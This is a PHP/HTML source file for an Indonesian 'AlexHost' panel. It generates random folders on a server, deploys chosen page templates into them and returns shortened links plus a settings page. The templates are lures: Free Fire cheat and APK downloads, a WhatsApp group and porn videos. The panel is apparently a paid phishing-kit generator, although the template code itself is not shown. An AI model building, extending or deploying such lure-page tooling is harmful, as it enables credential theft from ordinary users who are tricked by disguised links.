<?php 
include 'AlexShortLink.php';
session_start();
$_SESSION['session'] = bin2hex(random_bytes(32));

function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$zoneId = '9a5f1fb9df481fee3102c757bc0cf3dc';
$shortenedURL = shortenURL($longURL);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
   Free Web P
    </title>
    <meta name="theme-color" content="#23d5ab">
    <meta name="msapplication-navbutton-color" content="#23d5ab">
    <meta name="apple-mobile-web-app-status-bar-style" content="#23d5ab">
    <meta name="Description" content="Ini domain gratisan kalo merah/kaga bisa jan bacot. kalo mau enak modal Ya Kontol">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Bungee&family=Viga&display=swap');
        *
        {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex; 
            align-items: center;
            justify-content: center;
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 20s ease infinite;
        }
        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        .app {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex; 
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 20px;
        }
        .app .copy {
            width: 100%;
            position: absolute;
            bottom: 2px;
            left: 50%;
            transform: translateX(-50%);
            text-align: center;
            font-family: 'Viga', sans-serif;
            color: rgba(255,255,255,0.6);
            font-size: 13px;
        }
        .app .inner {
            margin-top: 5px;
            position: relative;
            width: 100%;
            display: flex; 
            align-items: center;
            justify-content: center;
        }
        .inner .input {
            position: relative;
            font-family: 'Viga', sans-serif;
            background: rgba( 255, 255, 255, 0.4 );
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            width: 400px;
            height: 40px;
            font-size: 15px;
            padding: 0 5px;
        }
        .inner .domains {
            position: absolute;
            top: 0;
            right: 0;
            height: 100%;
            z-index: 9999;
            background: #000;
            border-top-right-radius: 10px;
            border-bottom-right-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            background: rgba( 0, 0, 0, 0.4 );
            color: rgba( 255, 255, 255, 0.4 );
            font-family: 'Viga', sans-serif;
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur( 8px );
            padding: 0 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .app .input:before {
            content: 'for4.us';
            position: absolute;
            top: 0;
            right: 0;
            height: 100%;
            padding: 0 5px;
            z-index: 9999;
            background: #000;
        }
        .app .input:focus {
            outline: none;
            border: none;
        }
        .app .input::placeholder {
            color: rgba( 255, 255, 255, 0.4 );
        }
        .app h1 {
            font-family: 'Viga', sans-serif;
            color: rgba( 255, 255, 255, 0.4 );
            line-height: 25px;
        }
        h1 strong {
            font-family: 'Bungee', cursive;
            font-size: 2em;
        }
        .app .desc {
            font-family: 'Viga', sans-serif;
            color: rgba( 255, 255, 255, 0.4 );
        }
        .app .check {
            position: relative;
            margin-top: 20px;
            font-family: 'Viga', sans-serif;
            background: rgba( 255, 255, 255, 0.4 );
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            font-size: 16px;
            padding: 5px 20px;
        }
        .app .check:focus {
            outline: none;
            border: none;
        }

        .app .alert {
            position: relative;
            margin-top: 10px;
            font-family: 'Viga', sans-serif;
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            font-size: 14px;
            padding: 3px 15px 3px 25px;
            text-align: center;
            display: none;
        }
        .alert.success {
            background: rgba(124,252,0, 0.4);
        }
        .alert.error, .alert.failed, .alert.exsist, .alert.mistake {
            background: rgba( 255, 0, 0, 0.4 );
        }
        .alert.process {
            background: rgba(0,0,255, 0.4);
        }
        .alert i {
            position: absolute;
            top: 50%;
            left: 5px;
            transform: translateY(-50%);
        }
        .alert.process i {
            top: 25%;
        }

        .app label {
            width: 400px;
            text-align: left;
            font-family: 'Viga', sans-serif;
            color: rgba( 255, 255, 255, 0.7);
            margin-top: 20px;
        }

        .app .details {
            position: relative;
            margin-top: 20px;
            font-family: 'Viga', sans-serif;
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            padding: 10px;
            width: 400px;
            text-align: center;
            display: none;
        }
        .details h1{
            font-size: 20px;
        }
        .details .active {
            margin-top: 10px;
            position: relative;
            width: 100%;
            display: flex;
            align-items: center;
            flex-direction: column;
        }
        .active .info {
            position: relative;
            font-family: 'Viga', sans-serif;
            background: rgba( 255, 255, 255, 0.1 );
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            font-size: 13px;
            padding: 5px 15px;
        }
        .details table {
            margin-top: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.3);
            border-top: 1px solid rgba(255,255,255,0.3);
        }
        .active .click {
            position: relative;
            margin-top: 10px;
            font-family: 'Viga', sans-serif;
            background: rgba( 255, 255, 255, 0.4 );
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            font-size: 14px;
            padding: 5px 15px;
        }
        .active .click:focus {
            outline: none;
            border: none;
        }



        .app .btn {
            position: absolute;
            top: 10px;
            right: 10px;
            font-family: 'Viga', sans-serif;
            background: rgba( 255, 255, 255, 0.4 );
            color: rgba( 255, 255, 255, 0.4 );
            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.37 );
            backdrop-filter: blur( 8px );
            -webkit-backdrop-filter: blur( 8px );
            border-radius: 10px;
            border: 1px solid rgba( 255, 255, 255, 0.18 );
            font-size: 16px;
            padding: 5px 20px;
        }
        .app .btn:focus {
            outline: none;
            border: none;
        }
        @media(max-width:550px) {
            .app .input , .app .details, .app label{
                width: 100%;
            }
        }
        @media(min-width: 551px) {
            .inner .domains {
                display: none;
            }
        }
        .hidden {
            display: none;
        }
        
    </style>
    <script>
        // Fungsi untuk menampilkan elemen berdasarkan pilihan
        function showElement(elementId) {
            // Semua elemen dengan class "hidden" disembunyikan
            var hiddenElements = document.querySelectorAll('.hidden');
            hiddenElements.forEach(function (elem) {
                elem.style.display = 'none';
            });

            // Tampilkan elemen berdasarkan pilihan
            var selectedElement = document.getElementById(elementId);
            selectedElement.style.display = 'block';
        }
    </script>
</head>
<body>
    <div class="app">

        <div class="btn">
            Script Not Free
        </div>


        <h1>Created By</h1>
        <br>
        <h1><strong>AlexHost</strong></h1>
        <span class="alert error"><i class="fa fa-times-circle" aria-hidden="true"></i>Fill all forms</span>
        <span class="alert success"><i class="fa fa-check-circle" aria-hidden="true"></i>Success, Harap Simpan Website!</span>
        <span class="alert failed"><i class="fa fa-check-circle" aria-hidden="true"></i>Wrong Ip/Domain</span>
        <span class="alert process"><i class="fa fa-cog fa-spin" aria-hidden="true"></i>Proses!</span>
        <span class="alert exsist"><i class="fa fa-check-circle" aria-hidden="true"></i>Domain was taken</span>
        <span class="alert mistake"><i class="fa fa-check-circle" aria-hidden="true"></i>Kalau Gabisa Coba Ulang Dek!</span>

        
        <label for="list"> <b>Tampilan:</b>
        </label>
        <div class="inner">
          <select class="input" id="list" onchange="showElement(this.value)">
        <option class="input" selected disabled>Pilih terlebih dahulu...</option>
          <option value="tamp1">MediaFire Cheat FF</option>
          <option value="tamp2">MediaFire APK FF</option>
          <option value="tamp3">Grup WhatsApp</option>
          <option value="tamp4">BokepMama Hot</option>
          <option value="tamp5">Video Hot Terbaru</option>
          <option value="tamp6">MediaFire Bokep</option>
      </select>
    </label>
    </div>
            <label>
            <b>Folder:</b>
        </label>
        <div class="inner">
            <input class="input" type="text" name="domain" placeholder="<?= $subdomain?>" autocomplete="off" readonly>
        </div>
        <br>
        <div class="hidden" id="tamp1">
            <form id="isi-data1" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="1" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                <input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses1()">
            CHECK
        </button>
        </form>
                </div>
                
                        <div class="hidden" id="tamp2">
                        <form id="isi-data2" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="2" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                <input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses2()">
            CHECK
        </button>
        </form>
                </div>
                
                         <div class="hidden" id="tamp3">
                    <form id="isi-data3" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="3" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                <input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses3()">
            CHECK
        </button>
        </form>
                </div>
                
                        <div class="hidden" id="tamp4">
                        <form id="isi-data4" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="4" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses4()">
            CHECK
        </button>
        </form>
                </div>
                
                        <div class="hidden" id="tamp5"><form id="isi-data5" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="5" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses5()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp6"><form id="isi-data6" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="6" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses6()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp7"><form id="isi-data7" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="7" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses7()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp8"><form id="isi-data8" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="8" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses8()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp9"><form id="isi-data9" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="9" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses9()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp10"><form id="isi-data10" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="10" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses10()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp11"><form id="isi-data11" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="11" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses11()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp12"><form id="isi-data12" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="12" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses12()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp13"><form id="isi-data13" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="13" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses13()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp14"><form id="isi-data14" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="14" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly><input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses14()">
            CHECK
        </button></form>
                </div>
                
                        <div class="hidden" id="tamp15">
                        <form id="isi-data15" action="javascript:void(0)" method="POST">
                <input type="hidden" id="nomor" name="nomor" value="15" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                <input type="hidden" id="prosesbuat" name="prosesbuat" value="AlexHost" readonly>
                    <button type="submit" class="check" onclick="proses15()">
            CHECK
        </button></form>
                </div>
                
                
        <div class="details">
            <h1>DETAIL WEBSITE</h1>
            <table>
                <tr>
                    <th style="width: 50%;text-align: left;">Website Short:</th>
                    <th style="width: 50%;text-align: right;"><span id="domain"><?= $shortenedURL ?></span></th>
                </tr>
                <tr>
                <th style="width: 50%;text-align: left;">Website Asli:</th>
                    <th style="width: 50%;text-align: right;"><span id="domain"><?= $domain ?>/<?= $subdomain ?></span></th>
                </tr>
                <tr>
                    <th style="width: 50%;text-align: left;">Website Setting:</th>
                    <th style="width: 50%;text-align: right;"><span id="ip"><?= $domain ?>/<?= $subdomain ?>/AlexHostX.php</span></th>
                </tr>
            </table>
            <div class="active">
                <p class="info" onclick="SalinShort()">Salin Web Short</p>
                <br>
                <p class="info" onclick="OpenWeb()">Buka Website</p>
                <br>
                <p class="info" onclick="OpenSetting()">Buka Setting</p>
            </div>
        </div>

        <span class="copy">AlexHostX</span>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    function SalinShort() {
        var dummy = document.createElement("textarea");
        document.body.appendChild(dummy);
        dummy.value = "<?= $shortenedURL ?>";
        dummy.select();
        document.execCommand("copy");
        document.body.removeChild(dummy);
        alert("Berhasil Menyalin Link Anda!");
    }

    function OpenWeb() {
        window.location.href = "/<?= $subdomain ?>";
    }
    
    function OpenSetting() {
        window.location.href = "/<?= $subdomain ?>/AlexHostX.php";
    }
    </script>
    <script>
        function proses1(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data1').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses2(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data2').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
     <script>
        function proses3(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data3').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses4(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data4').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses5(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data5').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses6(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data6').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses7(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data7').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses8(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data8').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses9(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data9').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses10(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data10').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses11(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data11').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses12(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data12').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses13(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data13').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses14(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data14').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    <script>
        function proses15(){
            $nomor = $('#nomor').val().trim();
			$subdo = $('#subdo').val().trim();
			$prosesbuat = $('#prosesbuat').val().trim();
            $('.process').fadeIn();
            if($nomor == '' || $nomor == null){
                    $('.error').fadeIn();
                    $('.failed').hide();
                    $('.process').hide();
                    return false;
                    }
                
            $.ajax({
                    type: 'POST',
                    url: 'tambahweb.php',
                    data: $('#isi-data15').serialize(),
                    dataType: 'text',
                    success: function () {
                        setTimeout(() => {
                        $('.success').fadeIn();
                        $('.details').fadeIn();
                        },3000)
                        setTimeout(() => {
                        $('.process').hide();
                          },3000)
                      
                    }
                })
            }
    </script>
    
</body>
</html>